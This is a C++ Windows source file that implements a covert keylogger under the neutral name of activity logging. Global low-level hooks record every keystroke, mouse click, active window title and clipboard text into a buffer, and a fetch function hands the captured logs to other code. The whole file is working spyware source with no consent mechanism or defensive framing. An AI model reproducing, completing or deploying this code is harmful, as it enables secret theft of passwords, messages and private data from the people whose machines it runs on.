#include <windows.h>
#include "Activity.h"
#include <iostream>
#include <sstream>
#include <condition_variable>

static HHOOK activity_hook;
static HHOOK mouse_hook;
static HANDLE hThread;
static std::mutex activity_lock;
static std::ostringstream activity_log;

void checkWindow() {

  static std::string curr_title = "";
  static char wnd_title[256];

  HWND hwnd = GetForegroundWindow();
  GetWindowText(hwnd, wnd_title, sizeof(wnd_title));

  activity_lock.lock();

  if (((strlen(wnd_title) != 0) && curr_title.compare(wnd_title) != 0) ||
      !curr_title.length()) {
    curr_title = std::string(wnd_title);
    activity_log << "\n<WD: " << curr_title << ">\n";
  }
}

LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
  checkWindow();

  PKBDLLHOOKSTRUCT k = (PKBDLLHOOKSTRUCT)(lParam);
  if (wParam == WM_RBUTTONDOWN)
    activity_log << "<RCLK>";
  else if (wParam == WM_LBUTTONDOWN)
    activity_log << "<LCLK>";
  activity_lock.unlock();

  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK ClipWndProc(HWND hWnd, UINT uMsg, WPARAM wParam,
                             LPARAM lParam) {
  static BOOL bListening = FALSE;
  switch (uMsg) {
  case WM_CREATE:
    bListening = AddClipboardFormatListener(hWnd);
    return bListening ? 0 : -1;

  case WM_DESTROY:
    if (bListening) {
      RemoveClipboardFormatListener(hWnd);
      bListening = FALSE;
    }
    return 0;

  case WM_CLIPBOARDUPDATE:
    OpenClipboard(nullptr);
    HANDLE hData = GetClipboardData(CF_TEXT);
    char *pszText = static_cast<char *>(GlobalLock(hData));
    std::string text(pszText);
    GlobalUnlock(hData);
    CloseClipboard();

    activity_lock.lock();
    activity_log << "<CB: " << text << ">";
    activity_lock.unlock();
    return 0;
  }

  return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
  checkWindow();

  PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

  if (wParam == WM_KEYDOWN) {
    switch (p->vkCode) {
    case VK_CAPITAL:
      activity_log << "<CAPLOCK>";
      break;
    case VK_SHIFT:
      activity_log << "<SHIFT>";
      break;
    case VK_LCONTROL:
      activity_log << "<LCTRL>";
      break;
    case VK_RCONTROL:
      activity_log << "<RCTRL>";
      break;
    case VK_INSERT:
      activity_log << "<INSERT>";
      break;
    case VK_END:
      activity_log << "<END>";
      break;
    case VK_PRINT:
      activity_log << "<PRINT>";
      break;
    case VK_DELETE:
      activity_log << "<DEL>";
      break;
    case VK_BACK:
      activity_log << "<BK>";
      break;
    case VK_LEFT:
      activity_log << "<LEFT>";
      break;
    case VK_RIGHT:
      activity_log << "<RIGHT>";
      break;
    case VK_UP:
      activity_log << "<UP>";
      break;
    case VK_DOWN:
      activity_log << "<DOWN>";
      break;
    case VK_TAB:
      activity_log << "<TAB>";
      break;
    case VK_RETURN:
      activity_log << "<RETURN>";
      break;
    case VK_SPACE:
      activity_log << "<SPACE>";
      break;

    default:
      activity_log << char(tolower(p->vkCode));
    }
  }

  activity_lock.unlock();

  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI logActivity(LPVOID lpParameter) {
  WNDCLASSEX wndClass = {sizeof(WNDCLASSEX)};
  wndClass.lpfnWndProc = ClipWndProc;
  wndClass.lpszClassName = "ClipWnd";

  RegisterClassEx(&wndClass);
  HWND hWnd = CreateWindowEx(0, wndClass.lpszClassName, "", 0, 0, 0, 0, 0,
                             HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);

  mouse_hook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, NULL);
  activity_hook =
      SetWindowsHookExW(WH_KEYBOARD_LL, keyboardHookProc, NULL, NULL);

  static MSG msg{0};
  while (GetMessage(&msg, NULL, 0, 0) != 0) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  };
  UnhookWindowsHookEx(activity_hook);
  UnhookWindowsHookEx(mouse_hook);
  return 0;
}

int startLogging() {
  hThread = CreateThread(NULL, 0, logActivity, NULL, 0, NULL);

  if (hThread == NULL)
    return 1;
}

std::string fetchLogs() {
  activity_lock.lock();
  std::string logs = activity_log.str();
  activity_log.clear();
  activity_log.str("");
  activity_lock.unlock();
  return logs;
}

int stopLogging() {
  TerminateThread(hThread, 0);
  return CloseHandle(hThread);
}
